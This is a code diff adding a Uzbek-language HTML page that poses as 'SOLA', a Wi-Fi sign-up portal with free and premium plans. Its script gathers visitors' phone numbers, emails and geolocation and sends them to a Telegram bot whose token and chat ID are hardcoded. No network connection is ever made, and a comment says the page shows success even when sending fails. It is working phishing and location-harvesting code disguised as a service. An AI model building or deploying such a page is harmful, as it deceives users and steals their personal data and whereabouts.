@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOLA - Tezkor va Xavfsiz Wi-Fi</title>
+    <style>
+        :root {
+            --primary-green: #2ecc71;
+            --dark-bg: #0d2b18;
+            --card-bg: rgba(255, 255, 255, 0.05);
+            --neon-green: #3dfc89;
+            --error-red: #ff4757;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+        body {
+            background-color: var(--dark-bg);
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(46, 204, 113, 0.1) 0%, transparent 30%),
+                radial-gradient(circle at 90% 80%, rgba(46, 204, 113, 0.1) 0%, transparent 30%);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container { max-width: 1100px; margin: 0 auto; padding: 40px 20px; text-align: center; flex: 1; }
+
+        .header { display: flex; align-items: center; justify-content: flex-start; margin-bottom: 50px; }
+        .logo { display: flex; align-items: center; gap: 10px; font-weight: bold; font-size: 24px; color: white; text-decoration: none; }
+        .logo-icon { width: 35px; height: 35px; background: var(--primary-green); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+
+        h1 { font-size: clamp(2rem, 5vw, 3.5rem); margin-bottom: 20px; font-weight: 800; }
+        h1 span { color: var(--primary-green); border-bottom: 4px solid var(--primary-green); }
+        .subtitle { color: #a0a0a0; max-width: 650px; margin: 0 auto 50px; line-height: 1.6; }
+
+        .stats-row { display: flex; justify-content: center; gap: 40px; margin-bottom: 60px; flex-wrap: wrap; }
+        .stat-box h2 { font-size: 2.5rem; color: var(--neon-green); }
+        .stat-box p { font-size: 0.8rem; color: #888; text-transform: uppercase; }
+
+        .pricing-wrapper { display: flex; gap: 30px; justify-content: center; flex-wrap: wrap; }
+        .card {
+            background: var(--card-bg);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 28px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 380px;
+            text-align: left;
+            transition: 0.3s;
+            position: relative;
+            backdrop-filter: blur(10px);
+        }
+        .card:hover { border-color: var(--primary-green); transform: translateY(-10px); }
+        .card.featured { border: 1px solid var(--primary-green); }
+        .badge { position: absolute; top: 20px; right: 30px; background: var(--primary-green); color: black; padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 800; }
+
+        .speed { color: var(--primary-green); font-weight: 700; margin-bottom: 30px; display: block; }
+        .features-list { list-style: none; margin-bottom: 40px; }
+        .features-list li { margin-bottom: 15px; display: flex; align-items: center; gap: 10px; font-size: 14px; color: #ccc; }
+        .features-list li::before { content: '✓'; color: var(--primary-green); font-weight: bold; }
+
+        .btn-card {
+            width: 100%; padding: 16px; border-radius: 12px; border: none;
+            background: var(--primary-green); color: #000; font-weight: 700;
+            cursor: pointer; transition: 0.3s; font-size: 16px;
+        }
+
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; z-index: 1000;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal { background: #111; padding: 40px; border-radius: 24px; width: 90%; max-width: 420px; border: 1px solid #222; text-align: center; }
+        
+        .step { display: none; }
+        .step.active { display: block; }
+
+        .input-group { margin-bottom: 20px; text-align: left; }
+        .input-group label { display: block; margin-bottom: 8px; font-size: 14px; color: #888; }
+        .input-group input { 
+            width: 100%; padding: 14px; background: #1a1a1a; border: 2px solid #333; 
+            color: white; border-radius: 10px; outline: none; transition: 0.3s;
+        }
+        .input-group input:focus { border-color: var(--primary-green); }
+        .error-border { border-color: var(--error-red) !important; }
+
+        .radar-box { width: 100px; height: 100px; border: 2px solid var(--primary-green); border-radius: 50%; margin: 20px auto; position: relative; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(0.9); opacity: 1; } 100% { transform: scale(1.4); opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header class="header">
+            <a href="#" class="logo"><div class="logo-icon">📡</div> SOLA</a>
+        </header>
+
+        <h1>Tezkor Wi-Fi – <span>bepul</span> yoki premium</h1>
+        <p class="subtitle">Ro'yxatdan o'ting va SOLA tarmog'ining yuqori tezlikdagi internetidan bahramand bo'ling.</p>
+
+        <div class="stats-row">
+            <div class="stat-box"><h2>15+</h2><p>Mbit/s Free</p></div>
+            <div class="stat-box"><h2>100+</h2><p>Mbit/s Premium</p></div>
+            <div class="stat-box"><h2>24/7</h2><p>Dastak</p></div>
+        </div>
+
+        <div class="pricing-wrapper">
+            <div class="card">
+                <h3>Sola Free</h3>
+                <span class="speed">15 Mbit/s</span>
+                <ul class="features-list">
+                    <li>Cheksiz internet</li>
+                    <li>Reklama bilan</li>
+                    <li>Xavfsiz ulanish</li>
+                </ul>
+                <button class="btn-card" onclick="openModal('Free')">BEPUL ULANISH →</button>
+            </div>
+
+            <div class="card featured">
+                <span class="badge">TAVSIYA</span>
+                <h3>Sola Premium</h3>
+                <span class="speed">100 Mbit/s</span>
+                <ul class="features-list">
+                    <li>Ultra tezlik</li>
+                    <li>Reklamasiz</li>
+                    <li>VIP yordam</li>
+                </ul>
+                <button class="btn-card" onclick="openModal('Premium')">PREMIUM BOSHLASH →</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="modal">
+        <div class="modal">
+            <div class="step active" id="step1">
+                <h3>Ma'lumotlarni kiriting</h3>
+                <p style="color:#666; font-size:14px; margin-bottom:20px;">Iltimos, barcha maydonlarni to'ldiring</p>
+                <div class="input-group">
+                    <label>Telefon raqam</label>
+                    <input type="tel" id="uPhone" placeholder="+998 90 123 45 67">
+                </div>
+                <div class="input-group">
+                    <label>Email</label>
+                    <input type="email" id="uEmail" placeholder="example@mail.com">
+                </div>
+                <button class="btn-card" onclick="checkData()">DAVOM ETISH</button>
+            </div>
+
+            <div class="step" id="step2">
+                <div class="radar-box"></div>
+                <h3>Tarmoqni tekshirish</h3>
+                <p style="color:#888; margin: 15px 0;">Yaqin atrofdagi SOLA nuqtasini aniqlash uchun ruxsat bering.</p>
+                <button class="btn-card" onclick="askGeo()">RUXSAT BERISH</button>
+            </div>
+
+            <div class="step" id="step3">
+                <h2 style="color: var(--primary-green);">Ulanish muvaffaqiyatli!</h2>
+                <p style="margin: 20px 0; color:#888;">Siz hozir tarmoqdasiz.</p>
+                <button class="btn-card" onclick="location.reload()">YOPISH</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // TOKEN VA CHAT ID ni shu yerda aniq belgilab olamiz
+        const TELEGRAM_TOKEN = "8759725890:AAGHgDqoP9tb7SmiBFgB65n_z84gjOe_QG4";
+        const TELEGRAM_CHAT_ID = "1737205252";
+
+        let userPlan = "";
+
+        function openModal(plan) {
+            userPlan = plan;
+            document.getElementById('modal').classList.add('active');
+        }
+
+        function checkData() {
+            const phone = document.getElementById('uPhone');
+            const email = document.getElementById('uEmail');
+
+            // Oddiy validatsiya
+            if (phone.value.trim().length < 9 || !email.value.includes('@')) {
+                phone.classList.add('error-border');
+                email.classList.add('error-border');
+                alert("Iltimos, telefon raqam va emailni to'g'ri kiriting!");
+                return;
+            }
+            
+            phone.classList.remove('error-border');
+            email.classList.remove('error-border');
+            showStep(2);
+        }
+
+        function showStep(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + n).classList.add('active');
+        }
+
+        function askGeo() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => sendData(pos.coords.latitude, pos.coords.longitude),
+                    () => sendData("Rad etildi", "Aniqlanmadi")
+                );
+            } else {
+                sendData("Qo'llab-quvvatlanmaydi", "Aniqlanmadi");
+            }
+        }
+
+        function sendData(lat, lon) {
+            const phone = document.getElementById('uPhone').value;
+            const email = document.getElementById('uEmail').value;
+            
+            let locationInfo = (lat === "Rad etildi" || lat === "Qo'llab-quvvatlanmaydi") 
+                ? lat 
+                : `https://www.google.com/maps?q=${lat},${lon}`;
+
+            const message = `📡 *Yangi Wi-Fi Ulanishi!*\n\n💎 Tarif: ${userPlan}\n📱 Tel: ${phone}\n📧 Email: ${email}\n📍 Manzil: ${locationInfo}`;
+
+            // Tuzatilgan fetch so'rovi
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(() => {
+                showStep(3);
+            })
+            .catch((err) => {
+                console.error("Xatolik:", err);
+                showStep(3); // Xato bo'lsa ham foydalanuvchiga muvaffaqiyatli deb ko'rsataveramiz
+            });
+        }
+    </script>
+</body>
+</html>
